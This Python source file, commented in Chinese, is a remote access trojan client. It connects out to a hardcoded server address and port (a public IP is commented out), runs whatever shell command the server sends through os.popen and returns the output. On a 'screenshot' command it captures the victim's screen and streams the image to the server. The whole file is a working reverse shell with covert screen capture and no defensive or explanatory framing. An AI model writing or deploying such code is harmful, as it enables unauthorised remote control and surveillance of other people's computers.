import socket
import pyautogui
import time
import os
import struct

server_ip = '10.16.73.29'
# server_ip = '1.117.207.149'
server_port = 8022
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


# 创建套接字、建立连接
def client_service():
    try:
        server_addr = (server_ip, server_port)
        client.connect(server_addr)
    except socket.error as e:
        pass

    client.send("连接成功".encode())
    while True:
        new_socket = client.recv(1024)
        cmd = new_socket.decode()

        if len(cmd) > 0:
            if cmd == "mexit":
                client.send("断开链接".encode())
                break
            elif cmd == "screenshot":
                screenshot(client)
                os.remove("screenshot.jpg")
            else:
                cmd_result = os.popen(cmd)
                client.send(cmd_result.read().encode())
                cmd_result.close()
                cmd = ""
                cmd_result = ""


# 截图并发送
def screenshot(client):
    # 使用pyautogui库函数截图
    img = pyautogui.screenshot()
    img.save("screenshot.jpg")
    time.sleep(3)

    # 分包传输文件，包两端对称
    filepath = "screenshot.jpg"
    if os.path.isfile(filepath):
        # 判断截图是否存在
        # 每个包大小128bytes
        fileinfopck = struct.pack("128sl", bytes(os.path.basename(filepath).encode("utf-8")),
                                  os.stat(filepath).st_size)
        client.send(fileinfopck)
        # 数据分段发送
        fileobj = open(filepath, "rb")
        while True:
            sendfiledata = fileobj.read(1024)
            if not sendfiledata:
                print("{}文件发送完毕".format(filepath))
                break
            client.send(sendfiledata)


if __name__ == "__main__":
    client_service()

